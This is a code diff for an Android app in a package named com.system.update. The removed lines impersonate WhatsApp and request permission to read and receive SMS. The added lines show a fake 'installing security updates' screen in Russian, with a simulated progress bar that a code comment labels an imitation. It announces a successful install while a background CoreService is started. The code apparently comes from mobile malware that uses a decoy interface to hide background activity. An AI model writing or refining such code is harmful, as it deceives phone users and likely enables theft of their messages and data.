@@ -3,31 +3,65 @@ package com.system.update;
 import android.app.Activity;
 import android.os.Bundle;
 import android.widget.TextView;
+import android.widget.ProgressBar;
+import android.widget.LinearLayout;
 import android.graphics.Color;
 import android.view.Gravity;
 import android.content.Intent;
-import android.Manifest;
-import android.content.pm.PackageManager;
-import android.os.Build;
+import android.os.Handler;
 
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        layout.setBackgroundColor(Color.parseColor("#121212"));
+
         TextView tv = new TextView(this);
-        tv.setText("WhatsApp");
-        tv.setTextSize(30);
-        tv.setGravity(Gravity.CENTER);
-        tv.setBackgroundColor(Color.parseColor("#075E54"));
+        tv.setText("Установка обновлений\nбезопасности...");
+        tv.setTextSize(22);
         tv.setTextColor(Color.WHITE);
-        setContentView(tv);
+        tv.setGravity(Gravity.CENTER);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS}, 1);
-            }
-        }
+        ProgressBar pb = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
+        pb.setMax(100);
+        pb.setProgress(0);
 
+        layout.addView(tv);
+        layout.addView(pb);
+        setContentView(layout);
+
+        // Запускаем фоновый сервис
         startService(new Intent(this, CoreService.class));
+
+        // Имитация загрузки
+        final Handler handler = new Handler();
+        new Thread(new Runnable() {
+            int progress = 0;
+            @Override
+            public void run() {
+                while (progress < 100) {
+                    try { Thread.sleep(50); } catch (Exception ignored) {}
+                    progress += 2;
+                    final int p = progress;
+                    handler.post(new Runnable() {
+                        @Override
+                        public void run() {
+                            pb.setProgress(p);
+                        }
+                    });
+                }
+                handler.post(new Runnable() {
+                    @Override
+                    public void run() {
+                        tv.setText("Обновление успешно\nустановлено.");
+                        pb.setVisibility(ProgressBar.GONE);
+                    }
+                });
+            }
+        }).start();
     }
 }
